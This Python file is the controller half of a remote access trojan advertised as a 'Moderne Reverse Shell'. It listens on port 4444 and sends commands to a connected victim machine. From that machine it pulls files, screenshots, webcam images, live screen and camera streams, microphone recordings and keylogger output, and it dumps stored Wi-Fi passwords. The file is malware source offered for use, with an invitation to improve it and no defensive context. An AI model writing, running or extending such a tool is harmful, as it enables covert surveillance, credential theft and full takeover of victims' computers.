
#Moderne Reverse Shell with keyloger, screenshot, webcam, record audio, live streming.full system controll....


import cv2
import sys
import socket
import pickle
import struct
import numpy as np
from colorama import Fore, Back, init, Style
import time # Added for sleep

init()

def print_help():
    help_text = """ \n
    Available commands:\n
    - help                :   Display this help message.
    - cd <PATH>           :   Change directory on the target machine.
    - download <FILE>     :   Download a file from the target machine.
    - upload <FILE>       :   Upload a file to target machine.
    - screenshot          :   Capture an image from the target machine's monitor.
    - webcam              :   Capture an image from the target machine's webcam.
    - record              :   Record audio from the target machine's microphone.
    - stream_webcam       :   Stream live video from the target machine's webcam.
    - screenshare         :   Stream live video of the target machine's screen.
    - keylog              :   Start a keylooger and save it on keylog.txt.
    - sysinfo             :   Show all system information.
    - wfikey              :   Show all WIFIs Passwords (For windows only).
    - exit                :   Close the connection with the target machine.\n
    \n 
    """
    print(help_text)


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "192.168.1.6" #your local ip 
    port = 4444
    
    server.bind((host, port))
    server.listen(5)

    print(f"[*] Listening on {host}:{port}")

    while True:
        # Loop to continuously accept connections !
        try:
            client_socket, addr = server.accept()
            print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

            while True:
                # Loop for communication with the current client !!!
                try:
                    command = input("Shell $> ")

                    if command == 'exit':
                        client_socket.send(command.encode())
                        break
                    # Break from inner loop, server will wait for new connection

                    #This to download a specific file from client
                    elif command.startswith('download'):
                        client_socket.send(command.encode())
                        filename = command.split()[1]
                        with open(filename, 'wb') as f:
                            while True:
                                data = client_socket.recv(1024)
                                if not data or data.endswith(b'EOF'):
                                    f.write(data[:-3] if data.endswith(b'EOF') else data)
                                    break
                                f.write(data)
                        print(f"[+] {filename} DOWNLOADED SUCCCESSFULLY.")

                    #this to upload a specific file from server to client
                    elif command.startswith('upload'):
                        client_socket.send(command.encode())
                        filename = command.split()[1]
                        if os.path.exists(filename):
                            with open(filename, 'rb') as f:
                                while True:
                                    data = f.read(1024)
                                    if not data:
                                        client_socket.send(b'EOF')
                                        break
                                    client_socket.send(data)
                            print(f"[+] {filename} UPLOADED SUCCCESSFULLY.")
                        else:
                            print(f"[-] Error: File '{filename}' not found on server.")
                            client_socket.send(b'File not found on server.') 
                            
                    #this for screenshot
                    elif command.startswith('screenshot'):
                        client_socket.send(command.encode())
                        with open('screenshot.png', 'wb') as f:
                            while True:
                                data = client_socket.recv(1024)
                                if not data or data.endswith(b'EOF'):
                                    f.write(data[:-3] if data.endswith(b'EOF') else data)
                                    break
                                f.write(data)
                        print("[+] screenshot SAVED.")

                    #this for webcam
                    elif command.startswith('webcam'):
                        client_socket.send(command.encode())
                        with open('webcam.jpg', 'wb') as f:
                            while True:
                                data = client_socket.recv(1024)
                                if not data or data.endswith(b'EOF'):
                                    f.write(data[:-3] if data.endswith(b'EOF') else data)
                                    break
                                f.write(data)
                        print("[+] WEBCAM IMAGE RECEIVED.")

                    #recording an audio :)
                    elif command.startswith('record'):
                        client_socket.send(command.encode())
                        with open('recording.wav', 'wb') as f:
                            while True:
                                data = client_socket.recv(1024)
                                if not data or data.endswith(b'EOF'):
                                    f.write(data[:-3] if data.endswith(b'EOF') else data)
                                    break
                                f.write(data)
                        print("[+] AUDIO RECORDING RECEIVED.")

                    #very simple keylogger :|
                    elif command.startswith('keylog'):
                        client_socket.send(command.encode())
                        log = client_socket.recv(4096).decode()
                        print("[+] KEYLOOGER OUTPUT:")
                        print(log)
                    
                    #streaming over LAN (webcam)
                    elif command.startswith('stream_webcam'):
                        client_socket.send(command.encode())
                        print('[+] the \'WEBCAM STREAMING\' Running ...')
                        RESP = client_socket.recv(4096)
                        print(RESP.decode())
                    
                    #streaming over LAN (screen)
                    elif command.startswith('screenshare'):
                        client_socket.send(command.encode())
                        print('[+] the \'LIVE STREAM\' Running ... \n')
                        RES1 = client_socket.recv(4096)
                        print(RES1.decode())

                    #all system info
                    elif command.startswith("sysinfo"):
                        client_socket.send(command.encode())
                        infoo = client_socket.recv(4096) # Increased buffer size
                        print(infoo.decode())

                    #help msg
                    elif command == 'help':
                        print_help()
                    #show all wifi keys (For windows 7/10/11 only).
                    elif command == "wifikey":
                        client_socket.send(command.encode())
                        data = client_socket.recv(8192)
                        print(data.decode())

                    else:
                        client_socket.send(command.encode())
                        response = client_socket.recv(4096)
                        print(response.decode())

                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    print(f"[-] Client disconnected: {e}")
                    break
                # Break from inner loop to wait for a new connection
                except Exception as e:
                    print(f"[-] An error occurred during communication: {e}")
                    break
                # Break from inner loop to wait for a new connection

            client_socket.close()
            # Close the socket after client disconnects or an error
            print("[*] Waiting for a new connection...")

        except Exception as e:
            print(f"[-] Server error: {e}")
            print("[*] Restarting server listener...")
            time.sleep(5)
            # Wait before trying to accept new connections again

if __name__ == "__main__":
    main()



#Found an idea to improve it? Contact me securely at mehdizarry97@gmail.com
